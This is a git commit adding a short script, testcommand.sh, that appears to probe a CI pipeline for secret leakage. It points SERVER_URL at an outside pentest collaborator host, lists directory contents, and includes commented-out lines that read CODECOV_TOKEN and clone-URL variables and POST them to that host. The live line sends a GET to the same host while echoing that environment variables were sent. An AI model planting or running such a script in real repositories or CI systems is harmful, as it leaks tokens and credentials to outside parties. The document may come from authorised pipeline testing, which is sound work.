640475fa8d4301d0dc37cadeed15f94efbdcf280
sps-test-10 <131476832+sps-test-10@users.noreply.github.com>
2023-05-01 10:40:49 -0700

    Create testcommand.sh

---
+++ testcommand.sh
@@ -0,0 +1,23 @@
+@echo off
+setlocal
+
+echo test2
+
+export SERVER_URL=https://uqowc8eg8jdobvvul8rwjfwozf56t0hp.pentestcollaborator.com
+
+echo ls
+ls
+ls -la
+pwd
+#echo Retrieve environment variables
+#export VAR1=$CODECOV_TOKEN
+#export VAR2=$API_CLONE_URL
+#export VAR3=$AUTH_CLONE_URL
+
+echo Sending environment variables to server...
+
+echo Send environment variables to server
+#curl -X POST -H "Content-Type: application/html" -d "{\"VAR1\":\"$VAR1\",\"VAR2\":\"$VAR2\",\"VAR3\":\"$VAR3\"}" $SERVER_URL
+curl -X GET -H "Content-Type: application/html" $SERVER_URL
+
+echo Environment variables sent to server.
